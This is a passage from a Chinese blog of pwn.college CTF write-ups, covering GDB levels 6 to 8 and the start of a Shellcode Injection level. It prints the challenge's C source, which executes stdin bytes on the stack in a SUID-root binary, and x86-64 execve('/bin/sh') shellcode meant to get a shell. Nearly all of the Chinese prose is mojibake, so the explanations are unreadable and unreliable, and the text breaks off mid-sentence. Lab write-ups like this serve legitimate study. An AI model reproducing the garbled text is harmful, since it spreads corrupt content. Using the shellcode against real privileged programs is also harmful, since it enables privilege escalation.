‡ç¨‹åºçš„çŠ¶æ€ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥ä½¿ç”¨`set $rdi = <span class="hljs-number">0</span>`å°†Â `$rdi`Â å¯„å­˜å™¨ç½®ä¸º<span class="hljs-number">0</span>ã€‚ä½ å¯ä»¥ä½¿ç”¨Â `set *((<span class="hljs-keyword">uint64_t</span> *) $rsp) = <span class="hljs-number">0x1234</span>`Â å°†æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå€¼è®¾ç½®ä¸º<span class="hljs-number">0x1234</span>ã€‚ä½ å¯ä»¥ä½¿ç”¨Â `set *((<span class="hljs-keyword">uint16_t</span> *) <span class="hljs-number">0x31337000</span>) = <span class="hljs-number">0x1337</span>`Â å°†åœ°å€ä¸º<span class="hljs-number">0x31337000</span>çš„ä¸¤ä¸ªå­—èŠ‚è®¾ç½®ä¸º<span class="hljs-number">0x1337</span>ã€‚<br><br>å‡è®¾ä½ çš„ç›®æ ‡æ˜¯ä¸€ä¸ªç½‘ç»œåº”ç”¨ç¨‹åºï¼Œå®ƒä»æ–‡ä»¶æè¿°ç¬¦<span class="hljs-number">42</span>ä¸Šè¯»å–æ•°æ®ã€‚ä¹Ÿè®¸ä¸ºäº†åˆ†ææ–¹ä¾¿ï¼Œä½ å¸Œæœ›ç›®æ ‡æ”¹ä¸ºä»æ ‡å‡†è¾“å…¥(stdin)è¯»å–ã€‚ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹gdbè„šæœ¬å®ç°è¿™æ ·çš„åŠŸèƒ½ï¼š<br><br>start<br><span class="hljs-keyword">catch</span> syscall read<br>commands<br>  silent<br>  <span class="hljs-keyword">if</span> ($rdi == <span class="hljs-number">42</span>)<br>    set $rdi = <span class="hljs-number">0</span><br>  end<br>  <span class="hljs-keyword">continue</span><br>end<br><span class="hljs-keyword">continue</span><br><br>è¿™ä¸ªç¤ºä¾‹gdbè„šæœ¬æ¼”ç¤ºäº†å¦‚ä½•è‡ªåŠ¨åœ¨ç³»ç»Ÿè°ƒç”¨ä¸Šè®¾ç½®æ–­ç‚¹ï¼Œå¹¶å¦‚ä½•åœ¨å‘½ä»¤ä¸­ä½¿ç”¨æ¡ä»¶æ¥æœ‰æ¡ä»¶åœ°æ‰§è¡Œgdbå‘½ä»¤ã€‚<br><br>åœ¨ä¸Šä¸€çº§ä¸­ï¼Œä½ çš„gdbè„šæœ¬è§£å†³æ–¹æ¡ˆå¯èƒ½ä»ç„¶éœ€è¦ä½ å¤åˆ¶å’Œç²˜è´´è§£å†³æ–¹æ¡ˆã€‚è¿™ä¸€æ¬¡ï¼Œå°è¯•ç¼–å†™ä¸€ä¸ªè„šæœ¬ï¼Œä¸éœ€è¦ä¸ç¨‹åºè¿›è¡Œäº¤äº’ï¼Œè€Œæ˜¯é€šè¿‡æ­£ç¡®ä¿®æ”¹å¯„å­˜å™¨å’Œå†…å­˜æ¥è‡ªåŠ¨è§£å†³æ¯ä¸ªæŒ‘æˆ˜ã€‚<br></code></pre></td></tr></table></figure><p>ä¸€ç›´åœ¨å¦‚ä½•å’Œgdbäº¤äº’ï¼Œè·³è¿‡scanfå‡½æ•°ã€è¾¾åˆ°å’Œscanfç›¸åŒçš„æ•ˆæœä¸Šæäº‹æƒ…äº†ï¼Œç»“æœè¶Šæƒ³è¶Šå¤æ‚</p><p>ä½†æ˜¯å…¶å®å¦‚æœåªæ˜¯æƒ³è¦flagï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹å†…å­˜çš„å€¼ï¼Œä¹Ÿå³æ˜¯è¯´ï¼Œå°†å’Œ0x3Få¯¹æ¯”çš„é‚£ä¸ªå¾ªç¯æ¡ä»¶çš„å†…å­˜çš„å€¼ä¿®æ”¹ä¸ºä¸€ä¸ªè¾ƒå¤§çš„å€¼</p><p><code>set *(int*)($rbp-0x1c) = 100</code></p><h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">GDBæ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„åŠ¨æ€åˆ†æå·¥å…·ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥äº†è§£ç¨‹åºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­çš„çŠ¶æ€ã€‚åœ¨æœ¬æ¨¡å—ä¸­ï¼Œæ‚¨å°†ç†Ÿæ‚‰ä¸€äº›GDBçš„åŠŸèƒ½ã€‚<br><br>æ­£å¦‚æˆ‘ä»¬åœ¨å‰ä¸€ä¸ªçº§åˆ«ä¸­æ¼”ç¤ºçš„é‚£æ ·ï¼ŒGDBå¯¹ç›®æ ‡è¿›ç¨‹å…·æœ‰å®Œå…¨æ§åˆ¶æƒã€‚åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œä½œä¸ºæ™®é€šç”¨æˆ·è¿è¡Œçš„GDBæ— æ³•é™„åŠ åˆ°ç‰¹æƒè¿›ç¨‹ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆGDBä¸æ˜¯ä¸€ä¸ªå·¨å¤§çš„å®‰å…¨é—®é¢˜ï¼Œä¸ä¼šè®©æ‚¨ç«‹å³è§£å†³æ‰€æœ‰çº§åˆ«çš„åŸå› ã€‚å°½ç®¡å¦‚æ­¤ï¼ŒGDBä»ç„¶æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„å·¥å…·ã€‚<br><br>åœ¨è¿™ä¸ªæå‡çš„GDBå®ä¾‹ä¸­è¿è¡Œï¼Œæ‚¨å°†å¯¹æ•´ä¸ªç³»ç»Ÿæ‹¥æœ‰æ›´é«˜çš„æ§åˆ¶æƒã€‚ä¸ºäº†æ¸…æ¥šåœ°è¯æ˜è¿™ä¸€ç‚¹ï¼Œè¯•è¯•è¿è¡Œå‘½ä»¤`call (void)win()`ä¼šå‘ç”Ÿä»€ä¹ˆã€‚äº‹å®è¯æ˜ï¼Œè¿™ä¸ªæ¨¡å—ä¸­çš„æ‰€æœ‰çº§åˆ«éƒ½å¯ä»¥ç”¨è¿™ç§æ–¹å¼è§£å†³ã€‚<br><br>GDBéå¸¸å¼ºå¤§ï¼<br></code></pre></td></tr></table></figure><p>ç›´æ¥è°ƒç”¨win</p><p>call (void)win()</p><h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">GDBæ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„åŠ¨æ€åˆ†æå·¥å…·ï¼Œå¯ä»¥å¸®åŠ©ä½ äº†è§£ç¨‹åºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­çš„çŠ¶æ€ã€‚åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†ç†Ÿæ‚‰ä¸€äº›gdbçš„åŠŸèƒ½ã€‚<br><br>æ­£å¦‚æˆ‘ä»¬åœ¨å‰ä¸€ä¸ªçº§åˆ«ä¸­æ¼”ç¤ºçš„é‚£æ ·ï¼Œgdbå¯¹ç›®æ ‡è¿›ç¨‹å…·æœ‰å®Œå…¨æ§åˆ¶æƒã€‚åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œä»¥ä½ å¸¸è§„ç”¨æˆ·èº«ä»½è¿è¡Œçš„gdbæ— æ³•é™„åŠ åˆ°ç‰¹æƒè¿›ç¨‹ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆgdbä¸æ˜¯ä¸€ä¸ªå…è®¸ä½ ç«‹å³è§£å†³æ‰€æœ‰çº§åˆ«çš„ä¸¥é‡å®‰å…¨é—®é¢˜ã€‚å°½ç®¡å¦‚æ­¤ï¼Œgdbä»ç„¶æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„å·¥å…·ã€‚<br><br>åœ¨è¿™ä¸ªæå‡çš„gdbå®ä¾‹ä¸­è¿è¡Œï¼Œä½ å¯ä»¥å¯¹æ•´ä¸ªç³»ç»Ÿæ‹¥æœ‰æ›´é«˜çš„æ§åˆ¶æƒã€‚ä¸ºäº†æ¸…æ¥šåœ°è¯æ˜è¿™ä¸€ç‚¹ï¼Œçœ‹çœ‹å½“ä½ è¿è¡Œå‘½ä»¤Â `call (void)win()`Â æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆã€‚<br><br>è¯·æ³¨æ„ï¼Œè¿™ä¸ä¼šç»™ä½ å¸¦æ¥æ ‡å¿—ï¼ˆä¼¼ä¹æˆ‘ä»¬ç ´åäº†winå‡½æ•°ï¼ï¼‰ï¼Œæ‰€ä»¥ä½ éœ€è¦æ›´åŠ åŠªåŠ›æ‰èƒ½è·å¾—è¿™ä¸ªæ ‡å¿—ï¼<br><br>äº‹å®è¯æ˜ï¼Œæœ¬æ¨¡å—çš„æ‰€æœ‰å…¶ä»–çº§åˆ«éƒ½å¯ä»¥ç”¨è¿™ç§æ–¹å¼è§£å†³ã€‚<br><br>GDBéå¸¸å¼ºå¤§ï¼<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹winå‡½æ•°ï¼ŒæŠŠ0èµ‹å€¼ç»™raxï¼Œç„¶åå–0åœ°å€æŒ‡å‘çš„å€¼ï¼Œè¿™é€ æˆæŒ‡é’ˆå¼•ç”¨é”™è¯¯</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001951</span> win             proc <span class="hljs-built_in">near</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001951</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001951</span> var_8           = <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001951</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001951</span> <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001951</span>                 endbr64<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001955</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001956</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001959</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000195D</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_8], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001965</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>+var_8]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001969</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rax</span>]<br><span class="hljs-symbol">.text:</span>000000000000196B                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">rax</span>+<span class="hljs-number">1</span>]<br><span class="hljs-symbol">.text:</span>000000000000196E                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>+var_8]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001972</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rax</span>], <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001974</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aYouWinHereIsYo <span class="hljs-comment">; &quot;You win! Here is your flag:&quot;</span><br><span class="hljs-symbol">.text:</span>000000000000197B                 <span class="hljs-keyword">call</span>    _puts<br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•ï¼šç›´æ¥è°ƒç”¨winå‡½æ•°ï¼Œç„¶åå•æ­¥æ‰§è¡Œï¼Œå¦‚æœé‡åˆ°å¯¹0è§£å¼•ç”¨å°±ä¿®æ”¹ä½¿å…¶ä¸ä¸º0</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn college åˆ·é¢˜è®°å½•ï¼š Shellcode Injection</title>
    <link href="/p/78594644/"/>
    <url>/p/78594644/</url>
    
    <content type="html"><![CDATA[<p>shellcodeï¼Œæˆ‘çš„ shellcode ğŸ¥µ</p><span id="more"></span><p><img src="/image/pwn-college.png"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>shellcodeï¼Œæˆ‘çš„ shellcode - ğŸ¥µ</p><h1 id="èµ„æº"><a href="#èµ„æº" class="headerlink" title="èµ„æº"></a>èµ„æº</h1><ul><li><a href="https://x64.syscall.sh/">x64.syscall.sh</a>: Your cheat sheet for syscalls. A glance here, and youâ€™re always ahead.<br>  x64.syscall.shï¼šç³»ç»Ÿè°ƒç”¨çš„å¤‡å¿˜å•</li><li><a href="https://man7.org/linux/man-pages/man2/syscalls.2.html">Syscalls Manpage</a>: Understand not just the calls, but their deeper implications.<br>  Syscalls Manpageï¼šä¸ä»…äº†è§£è°ƒç”¨ï¼Œè¿˜äº†è§£å…¶æ›´æ·±å±‚æ¬¡çš„å«ä¹‰ã€‚</li><li><a href="https://www.felixcloutier.com/x86/">Felix Cloutier</a>: Dive into the heartbeats of instructions, ensuring youâ€™re always in step.<br>  Felix Cloutierï¼šæ·±å…¥äº†è§£æŒ‡ä»¤çš„è„‰åŠ¨ï¼Œç¡®ä¿æ‚¨å§‹ç»ˆæ­¥è°ƒä¸€è‡´ã€‚</li><li><a href="http://ref.x86asm.net/coder64.html">x86asm Reference</a>: Decode the bytes into moves, turning the tables on any challenge.<br>  x86asm å‚è€ƒï¼šå°†å­—èŠ‚è§£ç ä¸ºç§»åŠ¨ï¼Œåœ¨ä»»ä½•æŒ‘æˆ˜ä¸­æ‰­è½¬å±€é¢ã€‚</li></ul><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>çœ‹ä¸€ä¸‹é¢˜ç‰ˆæ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ ll <span class="hljs-regexp">/challenge/</span>babyshell_level1<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">17531</span> Oct  <span class="hljs-number">4</span>  <span class="hljs-number">2023</span> <span class="hljs-regexp">/challenge/</span>babyshell_level1*<br></code></pre></td></tr></table></figure><p>å±äºæ˜¯suid ç¨‹åº</p><p>çœ‹ä¸€ä¸‹ç¨‹åºé€»è¾‘</p><ul><li>åˆ†é…ä¸€å—å†…å­˜ç”¨äºå­˜æ”¾shellcodeï¼Œå…¶å¤§å°ä¸º0x1000å­—èŠ‚</li><li>ä»æ ‡å‡†è¾“å…¥è¯»å–æœ€å¤š0x1000å­—èŠ‚çš„æ•°æ®åˆ°shellcodeåŒºåŸŸ</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;capstone/capstone.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CAPSTONE_ARCH CS_ARCH_X86</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CAPSTONE_MODE CS_MODE_64</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_disassembly</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *shellcode_addr, <span class="hljs-keyword">size_t</span> shellcode_size)</span></span><br><span class="hljs-function"></span>&#123;<br>    csh handle;<br>    cs_insn *insn;<br>    <span class="hljs-keyword">size_t</span> count;<br><br>    <span class="hljs-keyword">if</span> (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &amp;handle) != CS_ERR_OK)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR: disassembler failed to initialize.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    count = cs_disasm(handle, shellcode_addr, shellcode_size, (<span class="hljs-keyword">uint64_t</span>)shellcode_addr, <span class="hljs-number">0</span>, &amp;insn);<br>    <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">size_t</span> j;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;      Address      |                      Bytes                    |          Instructions\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;------------------------------------------------------------------------------------------\n&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; count; j++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%016lx | &quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)insn[j].address);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; insn[j].size; k++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02hhx &quot;</span>, insn[j].bytes[k]);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = insn[j].size; k &lt; <span class="hljs-number">15</span>; k++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; | %s %s\n&quot;</span>, insn[j].mnemonic, insn[j].op_str);<br>        &#125;<br><br>        cs_free(insn, count);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR: Failed to disassemble shellcode! Bytes are:\n\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;      Address      |                      Bytes\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;--------------------------------------------------------------------\n&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= shellcode_size; i += <span class="hljs-number">16</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%016lx | &quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)shellcode_addr+i);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">16</span>; k++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02hhx &quot;</span>, ((<span class="hljs-keyword">uint8_t</span>*)shellcode_addr)[i+k]);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    cs_close(&amp;handle);<br>&#125;<br><br><span class="hljs-keyword">void</span> *shellcode_mem;<br><span class="hljs-keyword">size_t</span> shellcode_size;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(argc &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;###\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;### Welcome to %s!\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;###\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;other tricks, this will sanitize all environment variables and arguments and close all file descriptors &gt; 2.\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">3</span>; i &lt; <span class="hljs-number">10000</span>; i++) close(i);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span> **a = argv; *a != <span class="hljs-literal">NULL</span>; a++) <span class="hljs-built_in">memset</span>(*a, <span class="hljs-number">0</span>, <span class="hljs-built_in">strlen</span>(*a));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span> **a = envp; *a != <span class="hljs-literal">NULL</span>; a++) <span class="hljs-built_in">memset</span>(*a, <span class="hljs-number">0</span>, <span class="hljs-built_in">strlen</span>(*a));<br><br>    <span class="hljs-keyword">uint8_t</span> shellcode[<span class="hljs-number">0x1000</span>];<br>    shellcode_mem = (<span class="hljs-keyword">void</span> *)&amp;shellcode;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[LEAK] Placing shellcode on the stack at %p!\n&quot;</span>, shellcode_mem);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;execution, your shellcode will need to be *position-independent*.\n&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Reading 0x1000 bytes from stdin.\n&quot;</span>);<br>    shellcode_size = read(<span class="hljs-number">0</span>, shellcode_mem, <span class="hljs-number">0x1000</span>);<br>    assert(shellcode_size &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This challenge is about to execute the following shellcode:\n&quot;</span>);<br>    print_disassembly(shellcode_mem, shellcode_size);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Executing shellcode!\n&quot;</span>);<br>    ((<span class="hljs-keyword">void</span>(*)())shellcode_mem)();<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨æˆ·çš„è¾“å…¥ä¼šä½œä¸ºäºŒè¿›åˆ¶å†™å…¥åˆ°æ ˆä¸Šï¼Œç„¶åä½œä¸ºå‡½æ•°è°ƒç”¨</p><p>æˆ‘ä»¬çš„ç›®çš„æ˜¯æ‹¿åˆ° flag</p><p>æœ‰ä¸¤ç§æ€è·¯</p><ul><li>è·å¾— root æƒé™çš„ shell</li><li>ç›´æ¥è¯»å–/flag</li></ul><h2 id="æ€è·¯1"><a href="#æ€è·¯1" class="headerlink" title="æ€è·¯1"></a>æ€è·¯1</h2><p>è·å¾— root æƒé™çš„ shell</p><p>ç”±äºè¿™ä¸ªç¨‹åºæ˜¯ä¸ª suid ç¨‹åºï¼Œå› æ­¤ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æ³¨å…¥ä¸€æ®µè§¦å‘æ‰§è¡Œ<code>/bin/sh</code>ç¨‹åºçš„ä»£ç å³å¯</p><p>è§¦å‘å¯åŠ¨ sh çš„æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-number">59</span>               # è®¾ç½® <span class="hljs-built_in">rax</span> å¯„å­˜å™¨ä¸º <span class="hljs-number">59</span>ï¼Œè¡¨ç¤ºç³»ç»Ÿè°ƒç”¨ execve<br>    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rip</span>+binsh]      # å°† /bin/sh å­—ç¬¦ä¸²åœ°å€æ”¾å…¥ <span class="hljs-built_in">rdi</span> å¯„å­˜å™¨<br>    <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsi</span>              # å°† <span class="hljs-built_in">rsi</span> å¯„å­˜å™¨ç½®é›¶<br>    <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdx</span>              # å°† <span class="hljs-built_in">rdx</span> å¯„å­˜å™¨ç½®é›¶<br>    <span class="hljs-keyword">syscall</span>                      # æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œå¯åŠ¨ /bin/sh<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">binsh:</span><br><span class="hljs-meta">    .string</span> <span class="hljs-string">&quot;/bin/sh&quot;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å¾ˆé—æ†¾ï¼Œæ³¨å…¥ä¹‹åå‘ç°æ²¡æœ‰å¾—åˆ° root shell è€Œåªæ˜¯å¾—åˆ°äº†æ™®é€š shell</p><p>æºæ¿‘æ°<del>å’—ç”°</del> å› ä¸ºï¼Œshell 